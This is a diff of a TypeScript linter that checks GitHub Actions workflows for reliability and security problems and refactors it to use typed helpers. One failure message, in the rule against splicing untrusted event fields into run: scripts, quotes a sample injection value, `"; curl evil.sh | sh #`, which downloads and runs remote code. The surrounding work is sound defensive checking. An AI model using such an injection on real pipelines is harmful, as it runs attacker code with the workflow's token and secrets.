@@ -34,38 +34,17 @@ import YAML from 'yaml';
 
 import { inspectConcurrency } from './lib/concurrency.ts';
 import { inspectGateWiring } from './lib/gate-wiring.ts';
+import { isRecord, readJson, recordAt, stringAt, stringsAt } from './lib/json.ts';
 import { REPO_ROOT } from './lib/repo-root.ts';
-import { createGateReport, plural, type GateFailure } from './lib/report.ts';
-
-/*
- * Parsed YAML is whatever the file says. Only the containers the gate walks through are
- * named; every value it reads is `unknown` and checked where it is read.
- */
-type StepInputs = { cache?: unknown; ref?: unknown; tags?: unknown; push?: unknown; [input: string]: unknown };
-type Step = { uses?: unknown; run?: unknown; name?: unknown; if?: unknown; with?: StepInputs };
-type Permissions = string | Record<string, unknown> | null;
-type Job = {
-    'runs-on'?: unknown;
-    'timeout-minutes'?: unknown;
-    'if'?: unknown;
-    'needs'?: unknown;
-    'permissions'?: Permissions;
-    'steps'?: unknown;
-    'strategy'?: { matrix?: { include?: unknown; [key: string]: unknown } };
-};
-// eslint-disable-next-line @typescript-eslint/naming-convention -- GitHub's key, as a workflow file spells it.
-type Triggers = { workflow_run?: { workflows?: unknown } | null; [event: string]: unknown };
-type WorkflowDoc = {
-    name?: unknown;
-    on?: unknown;
-    /** YAML 1.1 reads a bare `on:` key as the boolean `true`. */
-    true?: unknown;
-    jobs?: Record<string, Job>;
-    concurrency?: unknown;
-    permissions?: Permissions;
-    /** A composite action's steps. */
-    runs?: Job;
-};
+import { collectFailures, createGateReport, plural, type GateFailure } from './lib/report.ts';
+import {
+    isStep,
+    isWorkflowDoc,
+    workflowShapeProblem,
+    type Job,
+    type Step,
+    type WorkflowDoc,
+} from './lib/workflow-docs.ts';
 
 export type PipelineOptions = {
     /** Repository root. Defaults to the caller's repo root. */
@@ -97,6 +76,8 @@ type PipelineInspection = {
 
 const WORKFLOW_DIR = '.github/workflows';
 const ACTIONS_DIR = '.github/actions';
+const SHAPE_WHY =
+    'GitHub refuses the file before running anything, and every rule below would be reading a shape it does not have.';
 
 /** Event payload fields an outsider controls. Each is attacker-supplied text. */
 const UNTRUSTED = [
@@ -124,12 +105,9 @@ const NPM_RUN = /\bnpm\s+(?:-w\s+(\S+)\s+)?run\s+([\w:@./-]+)/g;
 export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection {
     const { root = REPO_ROOT, checksDir = 'scripts/checks', ciWorkflow = `${WORKFLOW_DIR}/ci.yml` } = input;
 
-    const problems: GateFailure[] = [];
-    const fail = (file: string | null, what: string, why: string) => {
-        problems.push({ file, what, why });
-    };
+    const { problems, fail } = collectFailures();
 
-    const read = (rel: string) => fs.readFileSync(path.join(root, rel), 'utf8');
+    const read = (rel: string): string => fs.readFileSync(path.join(root, rel), 'utf8');
 
     const workflowDirPath = path.join(root, WORKFLOW_DIR);
     const workflowFiles = fs.existsSync(workflowDirPath)
@@ -155,7 +133,7 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
     for (const f of workflowFiles) {
         const rel = `${WORKFLOW_DIR}/${f}`;
         const src = read(rel);
-        let doc;
+        let doc: unknown;
         try {
             doc = YAML.parse(src);
         } catch (err) {
@@ -166,8 +144,12 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
             );
             continue;
         }
-        if (doc !== null && typeof doc === 'object') workflows.push({ rel, src, doc });
-        else parked.push(rel);
+        if (!isRecord(doc)) {
+            parked.push(rel);
+            continue;
+        }
+        if (isWorkflowDoc(doc)) workflows.push({ rel, src, doc });
+        else fail(rel, `is not a workflow GitHub can run: ${workflowShapeProblem(doc) ?? ''}`, SHAPE_WHY);
     }
 
     const actionsDirPath = path.join(root, ACTIONS_DIR);
@@ -185,8 +167,10 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
     for (const rel of actionFiles) {
         const src = read(rel);
         try {
-            const doc = YAML.parse(src);
-            if (doc !== null && typeof doc === 'object') actions.push({ rel, src, doc });
+            const doc: unknown = YAML.parse(src);
+            if (!isRecord(doc)) continue;
+            if (isWorkflowDoc(doc)) actions.push({ rel, src, doc });
+            else fail(rel, `is not an action GitHub can run: ${workflowShapeProblem(doc) ?? ''}`, SHAPE_WHY);
         } catch (err) {
             fail(
                 rel,
@@ -197,12 +181,12 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
     }
 
     /** YAML 1.1 reads a bare `on:` key as the boolean `true`, so both spellings are checked. */
-    const triggersOf = (doc: WorkflowDoc): Triggers => {
+    const triggersOf = (doc: WorkflowDoc): Record<string, unknown> => {
         const on = doc.on ?? doc.true;
-        return typeof on === 'object' && on !== null ? (on as Triggers) : {};
+        return isRecord(on) ? on : {};
     };
     const jobsOf = (doc: WorkflowDoc): [string, Job][] => Object.entries(doc.jobs ?? {});
-    const stepsOf = (job: Job): Step[] => (Array.isArray(job.steps) ? job.steps : []);
+    const stepsOf = (job: Job): Step[] => (Array.isArray(job.steps) ? job.steps.filter(isStep) : []);
     const isWorkflowRun = (doc: WorkflowDoc): boolean => Boolean(triggersOf(doc)['workflow_run']);
     const lineOf = (src: string, needle: string): number => src.slice(0, src.indexOf(needle)).split('\n').length;
 
@@ -215,6 +199,14 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
             jobs: [[path.basename(path.dirname(rel)), doc.runs ?? {}]] as [string, Job][],
         })),
     ];
+    /** Every step of every job, with where it sits, so a step rule is one loop. */
+    const sourceSteps = stepSources.flatMap(({ rel, src, jobs }) =>
+        jobs.flatMap(([name, job]) => stepsOf(job).map((step) => ({ rel, src, name, step }))),
+    );
+    /** The same, for workflows alone, with the workflow each step is in. */
+    const workflowSteps = workflows.flatMap(({ rel, doc }) =>
+        jobsOf(doc).flatMap(([name, job]) => stepsOf(job).map((step) => ({ rel, doc, name, step }))),
+    );
 
     // ── 1. timeout-minutes on every job ─────────────────────────────────────
     for (const { rel, doc } of workflows) {
@@ -300,7 +292,7 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
         if (typeof declared === 'string' && !declared.includes('${{')) return [declared];
 
         const matrix = job.strategy?.matrix;
-        if (matrix === undefined || typeof declared !== 'string') return values;
+        if (matrix == null || typeof declared !== 'string') return values;
 
         const key = /matrix\.([\w-]+)/.exec(declared)?.[1];
         if (key === undefined) return values;
@@ -308,7 +300,7 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
         const listed = matrix[key];
         if (Array.isArray(listed)) values.push(...listed.filter((v) => typeof v === 'string'));
         for (const entry of Array.isArray(matrix.include) ? matrix.include : []) {
-            const value = entry?.[key];
+            const value = isRecord(entry) ? entry[key] : undefined;
             if (typeof value === 'string') values.push(value);
         }
         return values;
@@ -325,47 +317,37 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
                 );
                 continue;
             }
-            for (const runner of runners) {
-                if (runner.endsWith('-latest')) {
-                    fail(
-                        rel,
-                        `job \`${name}\` runs on \`${runner}\` (line ${lineOf(src, runner)})`,
-                        "The `-latest` label is repointed at a new major on GitHub's schedule, taking the whole preinstalled toolchain with it — so a green pipeline starts failing, or starts linking a shipped binary against a different glibc, on a day you changed nothing. Pin the image, e.g. `ubuntu-24.04` or `macos-15`.",
-                    );
-                }
+            for (const runner of runners.filter((label) => label.endsWith('-latest'))) {
+                fail(
+                    rel,
+                    `job \`${name}\` runs on \`${runner}\` (line ${lineOf(src, runner)})`,
+                    "The `-latest` label is repointed at a new major on GitHub's schedule, taking the whole preinstalled toolchain with it — so a green pipeline starts failing, or starts linking a shipped binary against a different glibc, on a day you changed nothing. Pin the image, e.g. `ubuntu-24.04` or `macos-15`.",
+                );
             }
         }
     }
 
     // ── 6. npm ci, never npm install ────────────────────────────────────────
-    for (const { rel, src, jobs } of stepSources) {
-        for (const [name, job] of jobs) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.run !== 'string') continue;
-                if (/\bnpm\s+(?:i|install|add)\b(?![^\n]*\s-g\b)/.test(step.run)) {
-                    fail(
-                        rel,
-                        `job \`${name}\` runs \`npm install\` (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
-                        'install resolves the ranges afresh and rewrites package-lock.json to match, so CI validates a dependency tree no developer has. `npm ci` installs the lockfile exactly and fails on drift — which is the entire point of running it here.',
-                    );
-                }
-            }
+    for (const { rel, src, name, step } of sourceSteps) {
+        if (typeof step.run !== 'string') continue;
+        if (/\bnpm\s+(?:i|install|add)\b(?![^\n]*\s-g\b)/.test(step.run)) {
+            fail(
+                rel,
+                `job \`${name}\` runs \`npm install\` (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
+                'install resolves the ranges afresh and rewrites package-lock.json to match, so CI validates a dependency tree no developer has. `npm ci` installs the lockfile exactly and fails on drift — which is the entire point of running it here.',
+            );
         }
     }
 
     // ── 7. cache: npm on setup-node ─────────────────────────────────────────
-    for (const { rel, jobs } of stepSources) {
-        for (const [name, job] of jobs) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/setup-node@')) continue;
-                if (step.with?.cache !== 'npm') {
-                    fail(
-                        rel,
-                        `job \`${name}\` sets up Node without \`cache: npm\``,
-                        'Every run then re-downloads the whole dependency tree from the registry. Not a correctness problem, just a minute or two of every single run, forever.',
-                    );
-                }
-            }
+    for (const { rel, name, step } of sourceSteps) {
+        if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/setup-node@')) continue;
+        if (step.with?.cache !== 'npm') {
+            fail(
+                rel,
+                `job \`${name}\` sets up Node without \`cache: npm\``,
+                'Every run then re-downloads the whole dependency tree from the registry. Not a correctness problem, just a minute or two of every single run, forever.',
+            );
         }
     }
 
@@ -377,7 +359,7 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
         const jobs = new Map(jobsOf(doc));
         const needsOf = (job: Job | undefined): string[] => {
             const needs = job?.needs;
-            if (Array.isArray(needs)) return needs;
+            if (Array.isArray(needs)) return needs.filter((need) => typeof need === 'string');
             return typeof needs === 'string' ? [needs] : [];
         };
 
@@ -418,50 +400,42 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
     }
 
     // ── 9. checkout pinned to workflow_run.head_sha ─────────────────────────
-    for (const { rel, doc } of workflows) {
+    for (const { rel, doc, name, step } of workflowSteps) {
         if (!isWorkflowRun(doc)) continue;
-        for (const [name, job] of jobsOf(doc)) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/checkout@')) continue;
-                const ref = step.with?.ref;
-                if (typeof ref !== 'string' || !ref.includes('workflow_run.head_sha')) {
-                    fail(
-                        rel,
-                        `job \`${name}\` checks out ${typeof ref === 'string' && ref !== '' ? `\`${ref}\`` : 'the default ref'}`,
-                        // eslint-disable-next-line no-template-curly-in-string -- the fix quotes the expression to write into the workflow.
-                        'Under workflow_run the default is the branch HEAD at trigger time, not the commit the upstream run validated. They diverge exactly when commits land quickly — so what ships is code CI never saw. Pass `ref: ${{ github.event.workflow_run.head_sha }}`.',
-                    );
-                }
-            }
+        if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/checkout@')) continue;
+        const ref = step.with?.ref;
+        if (typeof ref !== 'string' || !ref.includes('workflow_run.head_sha')) {
+            fail(
+                rel,
+                `job \`${name}\` checks out ${typeof ref === 'string' && ref !== '' ? `\`${ref}\`` : 'the default ref'}`,
+                // eslint-disable-next-line no-template-curly-in-string -- the fix quotes the expression to write into the workflow.
+                'Under workflow_run the default is the branch HEAD at trigger time, not the commit the upstream run validated. They diverge exactly when commits land quickly — so what ships is code CI never saw. Pass `ref: ${{ github.event.workflow_run.head_sha }}`.',
+            );
         }
     }
 
     // ── 10. Image tags immutable ────────────────────────────────────────────
     let imagePushes = 0;
-    for (const { rel, doc } of workflows) {
-        for (const [name, job] of jobsOf(doc)) {
-            for (const step of stepsOf(job)) {
-                const tags = step.with?.tags;
-                if (typeof tags !== 'string') continue;
-                imagePushes += 1;
-                for (const tag of tags
-                    .split(/[\n,]+/)
-                    .map((t) => t.trim())
-                    .filter(Boolean)) {
-                    if (tag.endsWith(':latest')) {
-                        fail(
-                            rel,
-                            `job \`${name}\` pushes \`${tag}\``,
-                            'A mutable tag: the running pod cannot be traced back to a commit, and a rollback has no earlier tag to name. Tag with the commit SHA.',
-                        );
-                    } else if (!/head_sha|github\.sha/.test(tag)) {
-                        fail(
-                            rel,
-                            `job \`${name}\` pushes \`${tag}\`, which does not contain a commit SHA`,
-                            'Every deploy must be traceable to the exact commit CI validated. Interpolate `github.event.workflow_run.head_sha` into the tag.',
-                        );
-                    }
-                }
+    for (const { rel, name, step } of workflowSteps) {
+        const tags = step.with?.tags;
+        if (typeof tags !== 'string') continue;
+        imagePushes += 1;
+        for (const tag of tags
+            .split(/[\n,]+/)
+            .map((t) => t.trim())
+            .filter(Boolean)) {
+            if (tag.endsWith(':latest')) {
+                fail(
+                    rel,
+                    `job \`${name}\` pushes \`${tag}\``,
+                    'A mutable tag: the running pod cannot be traced back to a commit, and a rollback has no earlier tag to name. Tag with the commit SHA.',
+                );
+            } else if (!/head_sha|github\.sha/.test(tag)) {
+                fail(
+                    rel,
+                    `job \`${name}\` pushes \`${tag}\`, which does not contain a commit SHA`,
+                    'Every deploy must be traceable to the exact commit CI validated. Interpolate `github.event.workflow_run.head_sha` into the tag.',
+                );
             }
         }
     }
@@ -469,47 +443,43 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
     // ── 11. A BuildKit cache scope per image ────────────────────────────────
     /** scope -> the file and job that already claimed it. */
     const cacheScopes = new Map();
-    for (const { rel, doc } of workflows) {
-        for (const [name, job] of jobsOf(doc)) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.uses !== 'string' || !step.uses.startsWith('docker/build-push-action@')) continue;
-                const from = step.with?.['cache-from'];
-                const to = step.with?.['cache-to'];
-                if (typeof from !== 'string' || from === '' || typeof to !== 'string' || to === '') {
-                    fail(
-                        rel,
-                        `job \`${name}\` builds without \`cache-${typeof from === 'string' && from !== '' ? 'to' : 'from'}\``,
-                        'Every layer is rebuilt on every push, including any multi-GB download baked into the image. Use `type=gha,scope=<service>`.',
-                    );
-                    continue;
-                }
-                const scope = /scope=([^,\s]+)/.exec(to)?.[1];
-                if (scope === undefined) {
-                    fail(
-                        rel,
-                        `job \`${name}\` sets \`cache-to\` without a \`scope=\``,
-                        'Unscoped, every image shares one cache and each build evicts the others. Give each image its own scope.',
-                    );
-                    continue;
-                }
-                if (cacheScopes.has(scope)) {
-                    fail(
-                        rel,
-                        `job \`${name}\` reuses cache scope \`${scope}\` (also ${cacheScopes.get(scope)})`,
-                        'Two images writing one scope evict each other every run, so the cache is worse than none — it costs an upload to store what the next build discards.',
-                    );
-                } else {
-                    cacheScopes.set(scope, `${rel} job \`${name}\``);
-                }
-                const readScope = /scope=([^,\s]+)/.exec(from)?.[1];
-                if (from.includes('scope=') && readScope !== scope) {
-                    fail(
-                        rel,
-                        `job \`${name}\` reads cache scope \`${readScope}\` but writes \`${scope}\``,
-                        'The build never reads back what it wrote, so the cache is populated and never used.',
-                    );
-                }
-            }
+    for (const { rel, name, step } of workflowSteps) {
+        if (typeof step.uses !== 'string' || !step.uses.startsWith('docker/build-push-action@')) continue;
+        const from = step.with?.['cache-from'];
+        const to = step.with?.['cache-to'];
+        if (typeof from !== 'string' || from === '' || typeof to !== 'string' || to === '') {
+            fail(
+                rel,
+                `job \`${name}\` builds without \`cache-${typeof from === 'string' && from !== '' ? 'to' : 'from'}\``,
+                'Every layer is rebuilt on every push, including any multi-GB download baked into the image. Use `type=gha,scope=<service>`.',
+            );
+            continue;
+        }
+        const scope = /scope=([^,\s]+)/.exec(to)?.[1];
+        if (scope === undefined) {
+            fail(
+                rel,
+                `job \`${name}\` sets \`cache-to\` without a \`scope=\``,
+                'Unscoped, every image shares one cache and each build evicts the others. Give each image its own scope.',
+            );
+            continue;
+        }
+        if (cacheScopes.has(scope)) {
+            fail(
+                rel,
+                `job \`${name}\` reuses cache scope \`${scope}\` (also ${cacheScopes.get(scope)})`,
+                'Two images writing one scope evict each other every run, so the cache is worse than none — it costs an upload to store what the next build discards.',
+            );
+        } else {
+            cacheScopes.set(scope, `${rel} job \`${name}\``);
+        }
+        const readScope = /scope=([^,\s]+)/.exec(from)?.[1];
+        if (from.includes('scope=') && readScope !== scope) {
+            fail(
+                rel,
+                `job \`${name}\` reads cache scope \`${readScope}\` but writes \`${scope}\``,
+                'The build never reads back what it wrote, so the cache is populated and never used.',
+            );
         }
     }
 
@@ -562,82 +532,71 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
     }
 
     // ── 14. No untrusted input spliced into a `run:` block ──────────────────
-    for (const { rel, src, jobs } of stepSources) {
-        for (const [name, job] of jobs) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.run !== 'string') continue;
-                for (const field of UNTRUSTED) {
-                    if (!new RegExp(`\\$\\{\\{[^}]*\\b${field.replace(/\./g, '\\.')}\\b`).test(step.run)) continue;
-                    fail(
-                        rel,
-                        `job \`${name}\` interpolates \`${field}\` into a \`run:\` script (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
-                        `That expression is substituted into the script text before the shell parses it, so a branch or title of \`"; curl evil.sh | sh #\` executes with this workflow's token and secrets. Bind it through \`env:\` instead and reference "$VAR" — inside env it is a value, not source code.`,
-                    );
-                }
-            }
+    for (const { rel, src, name, step } of sourceSteps) {
+        if (typeof step.run !== 'string') continue;
+        for (const field of UNTRUSTED) {
+            if (!new RegExp(`\\$\\{\\{[^}]*\\b${field.replace(/\./g, '\\.')}\\b`).test(step.run)) continue;
+            fail(
+                rel,
+                `job \`${name}\` interpolates \`${field}\` into a \`run:\` script (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
+                `That expression is substituted into the script text before the shell parses it, so a branch or title of \`"; curl evil.sh | sh #\` executes with this workflow's token and secrets. Bind it through \`env:\` instead and reference "$VAR" — inside env it is a value, not source code.`,
+            );
         }
     }
 
     // ── 15. curl-installed binaries pinned and checksummed ──────────────────
-    for (const { rel, jobs } of stepSources) {
-        for (const [name, job] of jobs) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.run !== 'string' || !RELEASE_HOSTS.test(step.run)) continue;
-                const label =
-                    typeof step.name === 'string' && step.name !== '' ? `step "${step.name}"` : `job \`${name}\``;
-                if (!/\$\{?\w*(?:VERSION|_VER)\b/.test(step.run) && !/\/v?\d+\.\d+\.\d+\//.test(step.run)) {
-                    fail(
-                        rel,
-                        `${label} downloads a release asset from an unpinned URL`,
-                        'Without a version in the path it resolves to whatever is newest, so the toolchain changes under a pipeline nobody touched. Pin the version.',
-                    );
-                }
-                if (!/sha256sum|shasum|sha256/i.test(step.run)) {
-                    fail(
-                        rel,
-                        `${label} installs a downloaded binary without verifying a checksum`,
-                        'A pinned version names which release to fetch, not what that release contains — release assets can be replaced in place, and this one is piped into /usr/local/bin and then run. Record the sha256 next to the version and check it before installing.',
-                    );
-                }
-            }
+    for (const { rel, name, step } of sourceSteps) {
+        if (typeof step.run !== 'string' || !RELEASE_HOSTS.test(step.run)) continue;
+        const label = typeof step.name === 'string' && step.name !== '' ? `step "${step.name}"` : `job \`${name}\``;
+        if (!/\$\{?\w*(?:VERSION|_VER)\b/.test(step.run) && !/\/v?\d+\.\d+\.\d+\//.test(step.run)) {
+            fail(
+                rel,
+                `${label} downloads a release asset from an unpinned URL`,
+                'Without a version in the path it resolves to whatever is newest, so the toolchain changes under a pipeline nobody touched. Pin the version.',
+            );
+        }
+        if (!/sha256sum|shasum|sha256/i.test(step.run)) {
+            fail(
+                rel,
+                `${label} installs a downloaded binary without verifying a checksum`,
+                'A pinned version names which release to fetch, not what that release contains — release assets can be replaced in place, and this one is piped into /usr/local/bin and then run. Record the sha256 next to the version and check it before installing.',
+            );
         }
     }
 
     // ── 16. Every `npm run` a workflow invokes exists ───────────────────────
-    const rootPkg = JSON.parse(read('package.json'));
-    const rootScripts = new Set(Object.keys(rootPkg.scripts ?? {}));
+    const rootPkg = readJson(path.join(root, 'package.json'));
+    const rootScripts = new Set(Object.keys(recordAt(rootPkg, 'scripts')));
+    const workspaces = stringsAt(rootPkg, 'workspaces');
 
     /** Script names per workspace, by folder AND by package name — `npm -w` accepts either. */
-    const wsScripts = new Map();
-    for (const ws of rootPkg.workspaces ?? []) {
+    const wsScripts = new Map<string, Set<string>>();
+    for (const ws of workspaces) {
         const manifest = path.join(root, ws, 'package.json');
         if (!fs.existsSync(manifest)) continue;
-        const pkg = JSON.parse(fs.readFileSync(manifest, 'utf8'));
-        const names = new Set(Object.keys(pkg.scripts ?? {}));
+        const pkg = readJson(manifest);
+        const names = new Set(Object.keys(recordAt(pkg, 'scripts')));
         wsScripts.set(path.basename(ws), names);
-        if (typeof pkg.name === 'string' && pkg.name !== '') wsScripts.set(pkg.name, names);
+        const name = stringAt(pkg, 'name');
+        if (name !== undefined && name !== '') wsScripts.set(name, names);
     }
 
-    for (const { rel, jobs } of stepSources) {
-        for (const [name, job] of jobs) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.run !== 'string') continue;
-                for (const [, ws, script = ''] of step.run.matchAll(NPM_RUN)) {
-                    const available = ws !== undefined ? wsScripts.get(ws) : rootScripts;
-                    if (available === undefined) {
-                        fail(
-                            rel,
-                            `job \`${name}\` runs \`npm -w ${ws} run ${script}\`, but there is no \`${ws}\` workspace`,
-                            `Declared workspaces: ${(rootPkg.workspaces ?? []).join(', ')}.`,
-                        );
-                    } else if (!available.has(script)) {
-                        fail(
-                            rel,
-                            `job \`${name}\` runs \`npm run ${script}\`${ws !== undefined ? ` in \`${ws}\`` : ''}, which is not a script there`,
-                            'Renaming a script in package.json is a one-line edit that breaks CI from a file nobody had open. The failure surfaces on the next push, at whatever step happened to reference it.',
-                        );
-                    }
-                }
+    for (const { rel, name, step } of sourceSteps) {
+        if (typeof step.run !== 'string') continue;
+        for (const [, ws, script = ''] of step.run.matchAll(NPM_RUN)) {
+            const available = ws !== undefined ? wsScripts.get(ws) : rootScripts;
+            if (available === undefined) {
+                fail(
+                    rel,
+                    `job \`${name}\` runs \`npm -w ${ws} run ${script}\`, but there is no \`${ws}\` workspace`,
+                    `Declared workspaces: ${workspaces.join(', ')}.`,
+                );
+            } else if (!available.has(script)) {
+                fail(
+                    rel,
+                    `job \`${name}\` runs \`npm run ${script}\`${ws !== undefined ? ` in \`${ws}\`` : ''}, which is not a script there`,
+                    'Renaming a script in package.json is a one-line edit that breaks CI from a file nobody had open. The failure surfaces on the next push, at whatever step happened to reference it.',
+                );
             }
         }
     }
@@ -651,13 +610,13 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
                   .flatMap(([, job]) => stepsOf(job).map((s) => s.run))
                   .filter((r) => typeof r === 'string')
                   .join('\n');
-    const wiring = inspectGateWiring({ root, checksDir, ciWorkflow, scripts: rootPkg.scripts ?? {}, ciRuns });
+    const wiring = inspectGateWiring({ root, checksDir, ciWorkflow, scripts: recordAt(rootPkg, 'scripts'), ciRuns });
     problems.push(...wiring.problems);
 
     // ── 18. The CI node version satisfies engines.node ──────────────────────
-    const enginesNode = rootPkg.engines?.node;
+    const enginesNode = stringAt(recordAt(rootPkg, 'engines'), 'node');
 
-    if (typeof enginesNode !== 'string') {
+    if (enginesNode === undefined) {
         fail(
             'package.json',
             'declares no `engines.node`',
@@ -667,7 +626,7 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
         const floor = Number(/(\d+)/.exec(enginesNode)?.[1]);
 
         /** Every `node-version:` a workflow or composite action asks setup-node for. */
-        const nodeVersions = new Map();
+        const nodeVersions = new Map<string, number>();
         for (const { rel, src } of [...workflows, ...actions]) {
             for (const m of src.matchAll(/node-version:\s*'?"?(\d+)/g)) nodeVersions.set(rel, Number(m[1]));
         }
@@ -701,14 +660,15 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
     // A workflow with no `name:` is named by its path.
     const declaredNames = new Set(workflows.map((w) => (typeof w.doc['name'] === 'string' ? w.doc['name'] : w.rel)));
     for (const { rel, doc } of workflows) {
-        const waitsOn = triggersOf(doc)['workflow_run']?.workflows;
+        const workflowRun = triggersOf(doc)['workflow_run'];
+        const waitsOn = isRecord(workflowRun) ? workflowRun['workflows'] : undefined;
         if (!Array.isArray(waitsOn)) continue;
         for (const name of waitsOn) {
             if (typeof name !== 'string' || !declaredNames.has(name)) {
                 fail(
                     rel,
                     `waits on a workflow named '${String(name)}', which does not exist`,
-                    `GitHub matches the declared \`name:\`, not the filename, and a name matching nothing is not an error — this workflow simply never runs. Declared names: ${[...declaredNames].map((n) => `'${n}'`).join(', ') || 'none'}.`,
+                    `GitHub matches the declared \`name:\`, not the filename, and a name matching nothing is not an error — this workflow simply never runs. Declared names: ${declaredNames.size > 0 ? [...declaredNames].map((n) => `'${n}'`).join(', ') : 'none'}.`,
                 );
             }
         }
